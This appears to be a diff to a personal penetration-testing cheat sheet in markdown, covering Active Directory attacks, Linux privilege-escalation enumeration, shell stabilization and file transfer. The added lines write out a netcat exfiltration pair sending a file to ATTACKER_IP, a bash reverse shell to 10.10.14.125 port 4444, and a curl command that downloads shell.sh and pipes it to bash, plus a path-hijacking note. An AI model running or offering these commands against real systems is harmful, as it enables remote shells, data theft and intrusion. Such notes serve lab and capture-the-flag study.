@@ -198,7 +198,7 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
 - sudo -l
 - history
 - ps aux
-- SUID
+- SUID - Privileges
   - find / -perm -u=s -type f 2>/dev/null
   - find / -type f -perm -04000 -ls 2>/dev/null 
   - find / -type f -perm -4000 -user root -ls 2>/dev/null
@@ -221,6 +221,7 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - LinPeas
   - psexec.py
   - pspy
+- Read/write PATH (path hijacking)
   
 - Shell stabilize
   - python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -316,6 +317,19 @@ New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACK
 - python3 -m http.server 8000
 - wget attacker-machine:8000:file.ext
 - curl attacker-machine:8000:file.ext
+
+### Data extraction
+  - receiver: nc -nlvt PORT > file
+  - sender:   nc ATTACKER_IP PORT < file 
+
+### Other methods
+- Create a shell script that execute the desired command
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.125/4444 0>&1
+```
+- Upload the file to the target and execute it
+  - curl 10.10.14.125:8888/shell.sh|bash (maybe encode)
 
 # Buffer overflow
 - Upload file on Immunity Debugger (windows)
